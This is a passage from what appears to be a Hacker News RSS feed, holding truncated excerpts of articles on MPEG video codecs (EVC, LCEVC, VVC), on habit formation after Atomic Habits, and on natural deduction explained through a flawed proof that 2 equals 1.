<p>The&nbsp;<a href="https://mpeg.chiariglione.org/sites/default/files/files/standards/parts/docs/w17928.zip" target="_blank" rel="noopener">requirements of the EVC standard</a>&nbsp;were very clearly specified by MPEG as follows ‚Äì</p>



<ul><li>The test model should consist of two tool sets:&nbsp;<strong>a base and an enhanced tool set</strong></li><li>The base tool set should be configured with tools that were made public more than 20 years ago or for which a Type 1 declaration is received</li><li>There should be additional tools in the enhanced tool set, each of which shall provide a significant improvement in coding efficiency and be capable of being cleanly switched off on an individual basis</li></ul>



<p>EVC‚Äôs aim is crystal-clear ‚Äì provide a royalty-free option for content producers while also providing adequate tools, algorithms, and knobs to produce higher quality video (than the base tool set). And, the enhancement layer‚Äôs tools (also referred to as the Main layer) will be subject to royalties.</p>



<p>Sounds good, eh?</p>



<figure><img data-attachment-id="95" data-permalink="https://ottverse.com/evc-block-diagram-2019/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/evc-block-diagram-2019.png?fit=700%2C336&amp;ssl=1" data-orig-size="700,336" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="evc-block-diagram-2019" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/evc-block-diagram-2019.png?fit=300%2C144&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/evc-block-diagram-2019.png?fit=700%2C336&amp;ssl=1" loading="lazy" width="700" height="336" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/evc-block-diagram-2019.png?resize=700%2C336&amp;is-pending-load=1#038;ssl=1" alt="Block Diagram of the EVC Codec Presented at IBC2019 showing the Enhancement Layer tools in gray boxes" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/evc-block-diagram-2019.png?w=700&amp;ssl=1 700w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/evc-block-diagram-2019.png?resize=300%2C144&amp;ssl=1 300w" data-lazy-sizes="(max-width: 700px) 100vw, 700px" data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/evc-block-diagram-2019.png?resize=700%2C336&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Block Diagram of the EVC Codec Presented at IBC2019 showing the Enhancement Layer tools in gray boxes</figcaption></figure>



<p>It is also interesting to note the following sentence from the&nbsp;<a href="https://www.ibc.org/download?ac=10463" target="_blank" rel="noopener">IBC 2019 paper on EVC</a>&nbsp;and I quote,</p>



<blockquote><p>No considerations have been taken on licensing aspects of the technology other than a requirement for FRAND commitment by the contributors.&nbsp;<strong>Commercial aspects, and in particular, licensing aspects have been handled externally and independently of MPEG.</strong></p></blockquote>



<p>They‚Äôve been handled, huh? Okay cool, but I still cross my fingers and say a prayer when I hear ‚ÄúMPEG‚Äù and ‚ÄúLicensing‚Äù in the same sentence.</p>



<p>Let‚Äôs hope that EVC is adopted and supported in the industry quickly ‚Äì its a good concept and means well.</p>



<p>In a future article, we will do a deep dive into the tools supported in the Base and the Main layers of EVC.</p>



<p><strong>Reference</strong>&nbsp;‚Äì&nbsp;<a href="https://www.ibc.org/download?ac=10463" target="_blank" rel="noopener">The Emerging MPEG-5 EVC Standard ‚Äì Applications, Technology, and Results presented at IBC 2019</a></p>



<h2 id="low-complexity-enhancement-video-coding---lcevc-mpeg-5-part-2"><span id="Low_Complexity_Enhancement_Video_Coding_%E2%80%93_LCEVC_(MPEG5_Part_2)"></span>Low Complexity Enhancement Video Coding ‚Äì LCEVC (MPEG-5 Part 2)<span></span></h2>



<p>MPEG-5 Part 2 LCEVC is being introduced with the aim of increased compression efficiency for existing codecs at little or no-increase in coding complexity by using a base bitstream and an enhancement bitstream.</p>



<p>The LCEVC codec‚Äôs output is essentially a combination of a ‚Äúbase bitstream‚Äù produced by an existing video codec such as AVC, HEVC, VP9, AV1, etc. along with enhancement layers that can be used conditionally to improve the quality of the video.</p>



<p>If the decoder/end-device supports LCEVC, the enhancement layers are decoded, else, the base codec alone is used to decode the bitstream and the video is rendered to the user. This ensures backward-compatibility and encourages roll-out of the LCEVC codec without the fear of breaking the end-user‚Äôs experience.</p>



<p>This concept is nicely captured in the figure below taken from Guido Meardi‚Äôs&nbsp;<a href="https://www.itu.int/en/ITU-T/Workshops-and-Seminars/20191008/Documents/Guido_Meardi_Presentation.pdf" target="_blank" rel="noopener">presentation</a>&nbsp;at the ITU Workshop on the Future of Media in Geneva.</p>



<figure><img data-attachment-id="124" data-permalink="https://ottverse.com/lcevc-layers-video-coding/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-layers-video-coding.png?fit=800%2C354&amp;ssl=1" data-orig-size="800,354" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="lcevc-layers-video-coding" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-layers-video-coding.png?fit=300%2C133&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-layers-video-coding.png?fit=800%2C354&amp;ssl=1" loading="lazy" width="800" height="354" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-layers-video-coding.png?resize=800%2C354&amp;is-pending-load=1#038;ssl=1" alt="lcevc mpeg5 part2" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-layers-video-coding.png?w=800&amp;ssl=1 800w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-layers-video-coding.png?resize=300%2C133&amp;ssl=1 300w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-layers-video-coding.png?resize=768%2C340&amp;ssl=1 768w" data-lazy-sizes="(max-width: 800px) 100vw, 800px" data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-layers-video-coding.png?resize=800%2C354&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>For further details on LCEVC, please read </p>



<ul><li>our&nbsp;<a href="https://ottverse.com/lcevc-mpeg5-part2-low-complexity-enhancement-video-coding-guide/">architecture deep-dive</a>&nbsp;on LCEVC.</li><li><a href="https://ottverse.com/lcevc-vs-avc-using-ffmpeg/">comparison of LCEVC against H.264/AVC.</a></li></ul>



<p>On a final note, V-Nova has been instrumental in driving the LCEVC standard through their research and work on the Perseus codec. More information on that&nbsp;<a href="https://www.v-nova.com/v-nova-video-compression-technology/" target="_blank" rel="noopener">here</a>.</p>



<h2 id="what-next"><span id="What_Next"></span>What Next?<span></span></h2>



<p>I think 2020 and 2021 present great challenges and opportunities for the field of video compression.</p>



<p>With consumption increasing due to the COVID-19 situation, most content providers are under the gun to reduce their streaming costs. Dropping the bitrates is one way of reducing your streaming costs, but, conversely, it will be hard to compete with the likes of Netflix, Hulu, HBO, Peacock, fuboTV, DAZN with poor video quality.</p>



<p>If the compression experts can pull off VVC‚Äôs goals of 30% bitrate savings over HEVC, then it will be a huge win. The only thing they‚Äôll have to ensure is that they don‚Äôt blow their foot off with licensing issues (<em>a-la-HEVC</em>). If things work out properly, VVC should be a good competitor to AV1 especially at high resolutions such as 4K and 8K.</p>



<p><em><strong>However</strong></em>, that being said, I think that among the three codecs ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ottverse.com/vvc-evc-lcevc-mpeg-video-codecs/">https://ottverse.com/vvc-evc-lcevc-mpeg-video-codecs/</a></em></p>]]>
            </description>
            <link>https://ottverse.com/vvc-evc-lcevc-mpeg-video-codecs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24948460</guid>
            <pubDate>Sat, 31 Oct 2020 01:44:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Habits Maketh the Man (and Un-Maketh Him, Too)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24948444">thread link</a>) | @stanrivers
<br/>
October 30, 2020 | https://newsletter.butwhatfor.com/p/habits-maketh-the-man-and-un-maketh | <a href="https://web.archive.org/web/*/https://newsletter.butwhatfor.com/p/habits-maketh-the-man-and-un-maketh">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h6><em>Disclosure: Links to Amazon are generally affiliated links. As an Amazon Associate, we earn from qualifying purchases, meaning a commission may be generated on purchased items.</em></h6><blockquote><p><em>It is so easy to overestimate the importance of one defining moment and underestimate the value of making small improvements on a daily basis. Too often, we convince ourselves that massive success requires massive action.</em></p><p><em>- James Clear, Atomic Habits</em></p></blockquote><p><em>This post was inspired by&nbsp;<a href="https://amzn.to/3cUbKP1">Atomic Habits</a>, written by&nbsp;<a href="https://jamesclear.com/">James Clear</a>. Detailed notes and quotes can be found&nbsp;<a href="https://www.butwhatfor.com/atomic-habits-clear/">here</a>. Unattributed quotes below are from Clear‚Äôs writing.</em></p><p>Life is complex. Chaotic. Surprising. Uncertain. It is full of new things ‚Äî many of which can kill us. And that‚Äôs a problem, because we humans tend to prefer not dying. Fortunately, we have been practicing surviving for quite some time and have developed a way to&nbsp;<a href="https://medium.com/@beatsbyvanity/jordan-b-peterson-how-to-organize-your-life-for-success-d49cf42569ba">cut down on that chaos with a bit of order</a>: the ability to form habits. However, and unfortunately for those humans looking for more in life than just survival, these habits often have more control over us than we have control over them.</p><p>So what are habits and why do they control us?&nbsp;<a href="https://www.thebehavioralscientist.com/blog/your-house-is-holding-you-back-seriously">Jason Hreha</a>, a behavioral scientist who writes about life and business, summarizes that ‚Äúhabits are, simply, reliable solutions to recurring problems in our environment.‚Äù They are unconscious programs that free up our conscious mind to solve those non-recurring new problems that are constantly thrown our way. It‚Äôs too mentally expensive to try to figure out what you should do every day when you get home from work ‚Äî its much easier to have a program that loads without you knowing and tells you to change clothes. Putting on running shoes loads the running program. Smelling alcohol loads the drinking program. The important take away is that whether you notice them or not, the habits are running. This means that, for better or for worse, your habits are in charge of who you are in the future.</p><p>Fortunately, humans are conscious (which at times has its benefits). We can consciously uninstall bad old habits while installing new, better ones. This can push us towards a better version of our future self. In order to do so, Clear suggests we need to realize that 1) habits are best changed by a change in your&nbsp;<em>targeted</em>&nbsp;identity as opposed to goals alone and 2) your system of habits is far more important than your goals ‚Äî you do not rise to the level of your goals, but instead fall to the level of your systems. These two points are also interconnected ‚Äî our future identity is a lagging indicator of today‚Äôs systems. The only way you are a healthy person today is to have followed a system leading up to now that was that of a healthy person.</p><p>It is much easier for a&nbsp;<em>runner</em>&nbsp;to wake up early in the morning and head out into the rain before work than it is for a businessman wanting to get in shape. A&nbsp;<em>musician</em>&nbsp;can‚Äôt help but to find time to practice his violin, but the overloaded college student who wants to be able to play her favorite songs can easily find things get in the way. The runner and musician have no choice but to act in ways that are aligned with who they are. But how do you convince yourself that you are a runner or musician?</p><p>That is where the importance of your system comes into play. People often view themselves as a single entity, but we are in fact a new person every day we wake up. Today‚Äôs actions are votes for tomorrow‚Äôs me. Smoking a cigarette is a vote to be a future cigarette smoker. Remembering to kiss your wife in the morning is a vote to be a future loving husband. In the short term, you need the willpower to drive you. Eventually, the need for willpower falls away because your identity compels you into action. That sounds nice, for sure, but how does this all actually work in practice?</p><p>The first step is understanding how habits form ‚Äî and they form thanks to the&nbsp;<a href="https://www.brainfacts.org/thinking-sensing-and-behaving/learning-and-memory/2018/motivation-why-you-do-the-things-you-do-082818">dopamine reward system</a>&nbsp;our brains use to program our actions. Clear lays out this ‚Äúhabit loop‚Äù as occurring in four phases ‚Äî there are cues, cravings, responses and rewards. Check out the summary in the notes linked at the top of this post for more specifics, but in short, things in your environment remind your brain of a time it received a dopamine spike, prompting it to replay the actions that caused the dopamine spike most consistently when you were previously in a similar situation.</p><p>So how do you take advantage of your brain‚Äôs pathway for programing you? With the simple idea of making it easy. Your brain doesn‚Äôt ‚Äúactually want the habit itself. What you really want is the outcome the habit delivers. The greater the obstacle ‚Äî that is, the more difficult the habit ‚Äî the more friction there is between you and your desired end state. This is why it is crucial to make your habits so easy that you‚Äôll do them even when you don‚Äôt feel like it.‚Äù You need to make the habit cycle easy for those habits voting for the better future you and difficult for those voting for a diminished future you.</p><p>The ‚Äúenvironment is the invisible hand that shapes human behavior,‚Äù meaning that time and place drive your actions more than anything. When you walk into the kitchen, do you automatically open the refrigerator door without thinking? When you check an email on your phone, do you also open all your social media even though you weren‚Äôt planning on it? You need to&nbsp;<a href="https://jamesclear.com/habits-scorecard">take stock of these cues</a>&nbsp;and the associated habits before you can start to make changes. What do you do everyday and what triggers the loading of those programs?</p><p>This is not easy ‚Äî remember your habits are unconscious. That means even if you are paying attention, you are going to miss habits. But that doesn‚Äôt mean you shouldn‚Äôt try. And you‚Äôll get better the more you try. As the first step, you need to look at yourself as if you are another person. Take the time to watch yourself, asking ‚Äúwhy did I just do that?‚Äù It is impossible to do this constantly, but sit down and replay parts of your day when you did things you are proud of and those you are not. See what cues caused you to act as you did. Make sure to notice if another habit was the cue for your action ‚Äî is there a chain of habits getting you to where you ended up? It takes time, but you‚Äôll learn a lot about yourself.</p><p>After you have figured those out, you need to put yourself in an environment where it is obvious what you want yourself to do. This is where preparation and willpower today can change who you are in the future. It‚Äôs almost like time travel ‚Äî low budget of course, but still effective. Do you need to take medicine every morning? Put it next to your toothbrush. Do you need to wake up in the morning at a certain time. Put an alarm clock in another room that is set to automatically go off. Today‚Äôs you just changed tomorrow‚Äôs you.</p><p>Another powerful result from understanding your cues is recognizing when something in the environment is the cue for a bad habit. When your friends go out for a smoke, do you always stand up to go when they ask? Now that you have noticed why you are pulling out that pack of cigarettes, you can decide if you are fine with it or would like to change it. Want to override it? Force yourself to pull out flashcards for a new language every time they ask. If you are consistent, a new positive habit has hijacked an old one because you paid attention to how your environment was pulling you along.</p><p>And this all sounds terribly difficult, doesn‚Äôt it? That‚Äôs the opposite of easy, which is what we were going for. And this is why it is important to start small. Reading a new book every week sounds like a great habit. But it‚Äôs an impossibly difficult first step. Start with reading a page a day ‚Äî see where that takes you. Maybe that is too hard because you are tired when you get home. In that case, start with sitting in a chair holding a book for 2 minutes a day. Make it easy to start. Starting to run is the opposite of fun and easy. Start with putting running shoes on every morning. Eventually you might even step outside. While you are there, maybe your brain might say ‚Äúwhy not take a walk?‚Äù Walks can take a while, so why not just jog a little? A month later it is second nature to go out and run to the best your health will allow. If you had never started small, a month later you would still just be browsing social media.</p><p>Starting small can also help prevent us from failing into the trap of constantly preparing to act perfectly and, as a result, never acting. To steal from Robert Watson-Watt, ‚Äú&nbsp;<a href="https://www.irishtimes.com/life-and-style/health-family/don-t-try-to-be-the-best-just-be-good-enough-1.4012523">give them the third best to go on with; the second best comes too late, the best never comes.</a>&nbsp;‚Äú While it is great to wish that you had the perfect workout routine and the best plan of nutrition, if you spend all your time comparing theoretical future versions of you doing those routines, there is no more time left to actually become that future you. And who are you to say that you, who hasn‚Äôt even started,&nbsp;<a href="https://www.butwhatfor.com/invert-always-invert-avoid-failure-to-succeed/">can actually discern best from good enough</a>? There is time to perfect things as you go, but if you never get going, there will be nothing to perfect.</p><p>But then there are bound to be days where we don‚Äôt have the time or energy ‚Äî what are we to do then? We are only human, after all. The trick is to continue staving off the need for perfection ‚Äî consistency is more powerful than perfection. Whatever the habit is, do it even if you have to do it poorly. ‚ÄúToo often, we fall into an all-or-nothing cycle with our habits.‚Äù If you have been consistent in studying a new language every day, but today you just don‚Äôt have it in you ‚Äî spend two minutes instead of thirty. Two minutes is success, you have continued to vote for your desired future self and your system is intact. Zero minutes is not.</p><p>What do we do when we mess up and actually can‚Äôt even get past zero? It is good to realize that even those that succeed fail at times ‚Äî so the first step is realizing that all is not lost. But you must be paying attention so that you can catch the mistake before it becomes a new habit. ‚ÄúThe first mistake is never the one that ruins you. It is the spiral of ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://newsletter.butwhatfor.com/p/habits-maketh-the-man-and-un-maketh">https://newsletter.butwhatfor.com/p/habits-maketh-the-man-and-un-maketh</a></em></p>]]>
            </description>
            <link>https://newsletter.butwhatfor.com/p/habits-maketh-the-man-and-un-maketh</link>
            <guid isPermaLink="false">hacker-news-small-sites-24948444</guid>
            <pubDate>Sat, 31 Oct 2020 01:41:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How can we tell that 2‚â†1?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24948031">thread link</a>) | @samm81
<br/>
October 30, 2020 | http://chalkdustmagazine.com/features/how-can-we-tell-that-2%e2%89%a01/ | <a href="https://web.archive.org/web/*/http://chalkdustmagazine.com/features/how-can-we-tell-that-2%e2%89%a01/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<!-- .entry-meta -->
<section id="eu_cookie_law_widget-3">
<div data-hide-timeout="30" data-consent-expiration="180" id="eu-cookie-law">
	<p>

	Privacy &amp; Cookies: This site uses cookies. By continuing to use this website, you agree to their use. <br>
To find out more, including how to control cookies, see here:
		<a href="https://automattic.com/cookies/" rel="nofollow">
		Cookie Policy	</a>
</p></div>
</section><p>What if I told you that $2=1$? You may say I‚Äôm wrong. OK, well, what if I proved it to you? We can both agree that there‚Äôs an $x$ and a $y$ where $x = y$. From there, <a href="https://math.hmc.edu/funfacts/one-equals-zero/" target="_blank" rel="noopener noreferrer">multiply, subtract, factorise, divide, substitute, divide again</a>, and you get $2 = 1$.</p>
<p>Still not happy? You‚Äôre probably unconvinced by my so-called ‚Äòproof‚Äô. OK, I say, and, after a minute, hand you a sheet of paper with the following hastily scrawled on it: <a href="https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/1.png"><img loading="lazy" src="https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/1.png?resize=204%2C188" alt="" width="204" height="188" srcset="https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/1.png?resize=300%2C277 300w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/1.png?resize=1%2C1 1w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/1.png?w=470 470w" sizes="(max-width: 204px) 100vw, 204px" data-recalc-dims="1"></a>It‚Äôs better, but you‚Äôre still displeased. This time, I‚Äôve made clear what steps I‚Äôm taking from $x = y$ to $2 = 1$. However, you point out, I don‚Äôt connect any of these steps. Nodding slowly, I take my time and write out a very nice, orderly proof, complete with justifications for each line:<a href="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/2.png"><img loading="lazy" src="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/2.png?resize=454%2C241" alt="" width="454" height="241" srcset="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/2.png?w=1200 1200w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/2.png?resize=300%2C160 300w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/2.png?resize=1024%2C544 1024w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/2.png?resize=768%2C408 768w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/2.png?resize=2%2C1 2w" sizes="(max-width: 454px) 100vw, 454px" data-recalc-dims="1"></a></p>
<p>At this point, you spot my mistake: in going from line 4 to 5, I have divided both sides by $x-y$. But we began with the assumption that $x = y$, meaning that $x-y = 0$, and dividing by 0 is not defined! This means that lines 5 to 7 are operating on nonexistent values and are therefore meaningless.</p>
<p>You‚Äôre happy with yourself, but something is bothering you. To reveal my mistake, you asked me to be more precise. But why stop here? Because you found what you were looking for? That‚Äôs not how truth is found.</p>
<p>My proof, like all proofs, is a path from one statement to another, just as we may follow the path from $ax^2 + bx + c = 0$ to $x = \big(-b \pm \sqrt{b^2-4ac}\big)/{2a}$, or from the existence of rectangles to the transitivity of parallelism (see below). Along this path I have made several intermediate statements, and linked them together with justifications. You found that one of my links is flawed, and you wonder how we know that the others aren‚Äôt also wrong. You begin to question foundational principles, wondering, for instance, <a href="https://math.stackexchange.com/a/805939/24325" target="_blank" rel="noopener noreferrer">why we‚Äôre even allowed to do the same thing to both sides of an equation</a>.</p>
<p><strong>Euclidean geometry:</strong> For the unfamiliar‚ÄîEuclidean geometry (standard geometry on a flat surface) rests on 5 assumptions, one of which (the <em>parallel postulate</em>) has historically been regarded as ugly. In attempting to eliminate the parallel postulate, mathematicians have found numerous other statements that are equivalent to it, such as that a rectangle exists or that parallelism is transitive.</p>
<p>You keep digging deeper and deeper, questioning more and more of what you previously took to be correct. Eventually, you come across a piece of mathematics that is perhaps the most beautiful and elegant thing you‚Äôve ever laid your eyes upon: <em>natural deduction</em>.</p>
<h2>Natural deduction</h2>
<p>Natural deduction is one result of asking for deeper and deeper justification when doing maths. A system of natural deduction is a set of very simple, almost irrefutable rules that act to formalise our intuition about what is <em>definitely true</em>.</p>
<div id="attachment_15535"><p><a href="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/3.png"><img aria-describedby="caption-attachment-15535" loading="lazy" src="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/3.png?resize=124%2C71" alt="" width="124" height="71" srcset="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/3.png?w=293 293w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/3.png?resize=2%2C1 2w" sizes="(max-width: 124px) 100vw, 124px" data-recalc-dims="1"></a></p><p id="caption-attachment-15535">Reiteration (R): if $P$, then $P$.</p></div>
<p>These rules include such things as <em>reiteration</em>, which simply allows us to repeat ourselves. Precisely, reiteration says that if you know that a statement $P$ is true, then you can conclude that $P$ is true. This is hardly controversial.</p>
<div id="attachment_15536"><p><a href="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/4.png"><img aria-describedby="caption-attachment-15536" loading="lazy" src="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/4.png?resize=193%2C120" alt="" width="193" height="120" srcset="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/4.png?w=422 422w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/4.png?resize=300%2C187 300w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/4.png?resize=2%2C1 2w" sizes="(max-width: 193px) 100vw, 193px" data-recalc-dims="1"></a></p><p id="caption-attachment-15536">Conjunction introduction ($\land$I): if $P$ and $Q$ then $P\land Q$.</p></div>
<p>There are two rules for the natural idea of ‚Äòand‚Äô. First is the so-called <em>conjunction introduction</em> rule, stating that if you know that $P$ and $Q$ are both true, then you may conclude $P \land Q$, pronounced ‚Äò$P$ and $Q$‚Äô. On the other side, we have <em>conjunction elimination</em>, stating that if you know that $P \land Q$ is true, then you may conclude $P$ and also may conclude $Q$.</p>
<div id="attachment_15537"><p><a href="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/5.png"><img aria-describedby="caption-attachment-15537" loading="lazy" src="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/5.png?resize=176%2C121" alt="" width="176" height="121" srcset="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/5.png?w=384 384w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/5.png?resize=300%2C205 300w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/5.png?resize=1%2C1 1w" sizes="(max-width: 176px) 100vw, 176px" data-recalc-dims="1"></a></p><p id="caption-attachment-15537">Conjunction elimination ($\land$E): if $P\land Q$, then $P$ and $Q$.</p></div>
<p>These rules don‚Äôt feel like they do much besides swapping out ‚Äòand‚Äô for ‚Äò$\land$‚Äô; however, doing so is important for formality and precision.</p>
<div id="attachment_15538"><p><a href="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/6.png"><img aria-describedby="caption-attachment-15538" loading="lazy" src="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/6.png?resize=172%2C78" alt="" width="172" height="78" srcset="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/6.png?w=373 373w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/6.png?resize=300%2C136 300w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/6.png?resize=2%2C1 2w" sizes="(max-width: 172px) 100vw, 172px" data-recalc-dims="1"></a></p><p id="caption-attachment-15538">Disjunction introduction ($\lor$I): if $P$, then $P\lor Q$.</p></div>
<p>Things start to get tricky with the rules codifying ‚Äòor‚Äô. The first, <em>disjunction introduction</em>, tells us that if $P$ is true, then you may conclude $P \lor Q$, pronounced ‚Äò$P$ or $Q$‚Äô: if I am hungry, then it‚Äôs also true that I‚Äôm either hungry or tired.</p>
<div id="attachment_15539"><p><a href="https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/7.png"><img aria-describedby="caption-attachment-15539" loading="lazy" src="https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/7.png?resize=258%2C332" alt="" width="258" height="332" srcset="https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/7.png?w=568 568w, https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/7.png?resize=232%2C300 232w, https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/7.png?resize=1%2C1 1w" sizes="(max-width: 258px) 100vw, 258px" data-recalc-dims="1"></a></p><p id="caption-attachment-15539">Disjunction elimination ($\lor$E): if $P\lor Q$ and from $P$ we can prove $X$ and from $Q$ we can prove $X$, then $X$.</p></div>
<p>The second rule, <em>disjunction elimination</em>, states that if $P \lor Q$ is true, and from $P$ you can prove $X$, and from $Q$ you can prove $X$, then you may conclude $X$. More colloquially, if either $P$ or $Q$ is true, and in both cases $X$ is true, too, then $X$ is true. For example, if I‚Äôm either well-rested or well-fed, and being well-rested makes me happy, and being well-fed makes me happy, then I must be happy.</p>
<div id="attachment_15540"><p><a href="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/8.png"><img aria-describedby="caption-attachment-15540" loading="lazy" src="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/8.png?resize=222%2C212" alt="" width="222" height="212" srcset="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/8.png?w=472 472w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/8.png?resize=300%2C287 300w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/8.png?resize=1%2C1 1w" sizes="(max-width: 222px) 100vw, 222px" data-recalc-dims="1"></a></p><p id="caption-attachment-15540">Implication introduction ($\Rightarrow$I): if from $P$ we can prove $Q$, then $P\Rightarrow Q$.</p></div>
<p>Then come the rules regarding implication. We have <em>implication introduction</em>, stating that if from $P$ we can prove $Q$, then we may conclude $P \Rightarrow Q$, pronounced ‚Äò$P$ implies $Q$‚Äô. And we have <em>implication elimination</em> (also known as <em>modus ponens</em>), which states that if $P \Rightarrow Q$ is true and $P$ is true, then we can conclude $Q$. If the weather being rainy implies that I am cosy, and the weather is rainy, then I must be cosy.</p>
<div id="attachment_15541"><p><a href="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/9.png"><img aria-describedby="caption-attachment-15541" loading="lazy" src="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/9.png?resize=220%2C121" alt="" width="220" height="121" srcset="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/9.png?w=477 477w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/9.png?resize=300%2C165 300w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/9.png?resize=2%2C1 2w" sizes="(max-width: 220px) 100vw, 220px" data-recalc-dims="1"></a></p><p id="caption-attachment-15541">Implication elimination ($\Rightarrow$E): if $P\Rightarrow Q$ and $P$, then $Q$.</p></div>
<p>Finally, we come to the most arcane rules, those handling negation. The negation of $P$ is written $\neg P$ and pronounced ‚Äònot $P$‚Äô. Before talking about the $\neg P$ rules, however, we must first introduce a new symbol: $\bot$ (pronounced ‚Äòbottom‚Äô), which represents impossibility or contradiction. We can then introduce <em>bottom introduction</em>, which states that if both $P$ and $\neg P$ are true, which is absurd (usually‚Ä¶ there are systems of logic that admit both $P$ and $\neg P$ at the same time, called <em>paraconsistent</em> logics), then we can conclude $\bot$, to represent this impossibility.</p>
